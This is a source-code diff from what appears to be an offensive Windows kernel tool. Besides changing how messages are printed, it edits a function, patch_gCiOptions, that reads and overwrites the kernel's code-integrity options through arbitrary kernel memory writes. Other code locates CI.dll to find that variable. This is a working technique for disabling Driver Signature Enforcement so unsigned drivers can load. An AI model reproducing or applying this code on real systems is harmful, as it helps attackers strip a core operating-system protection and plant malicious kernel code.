@@ -5,6 +5,7 @@
 //#include "ntstatus.h"
 #include "KernelCallbacks.h"
 #include "NtoskrnlOffsets.h"
+#include "PrintFunctions.h"
 #include "KernelMemoryPrimitives.h"
 #include "KernelUtils.h"
 #include "tchar.h"
@@ -19,7 +20,7 @@
 		sizeof(CiInfo),
 		nullptr);
 	if (!NT_SUCCESS(Status))
-		printf("[-] Failed to query code integrity status: %08X\n", Status);
+		printf_or_not("[-] Failed to query code integrity status: %08X\n", Status);
 
 	return (CiInfo.CodeIntegrityOptions &
 		(CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) == CODEINTEGRITY_OPTION_ENABLED;
@@ -43,18 +44,19 @@
              if (_tcscmp(driver, L"CI.dll") == 0) {
                  CiBaseAddress = cbFunction - driverOffset;
                  if (verbose)
-                     printf("[+] %s FOUND at %016llx - 0x%llx : 0x%llx\n", driver, cbFunction, driverOffset, CiBaseAddress);
+                     _tprintf_or_not(TEXT("[+] %s FOUND at %016llx - 0x%llx : 0x%llx\n"), driver, cbFunction, driverOffset, CiBaseAddress);
                  return CiBaseAddress;
              }
          }
      }
+     */
      return CiBaseAddress;
  }
 
- BOOL patch_gCiOptions(PVOID CiVariableAddress, ULONG CiOptionsValue, PULONG OldCiOptionsValue) {
-     *OldCiOptionsValue = ReadMemoryDWORD64(CiVariableAddress);
+ BOOL patch_gCiOptions(DWORD64 CiVariableAddress, ULONG CiOptionsValue, PULONG OldCiOptionsValue) {
+     *OldCiOptionsValue = ReadMemoryDWORD(CiVariableAddress);
      //printf("[+KERNELDSE] The value of gCI at 0x%llx is 0x%x.\n", CiVariableAddress, *OldCiOptionsValue);
-     WriteMemoryDWORD64(CiVariableAddress, CiOptionsValue);
+     WriteMemoryDWORD(CiVariableAddress, CiOptionsValue);
      //printf("[+KERNELDSE] New value of gCI at 0x%llx is 0x%x.\n", CiVariableAddress, ReadMemoryDWORD64(CiVariableAddress));
      return TRUE;
  }
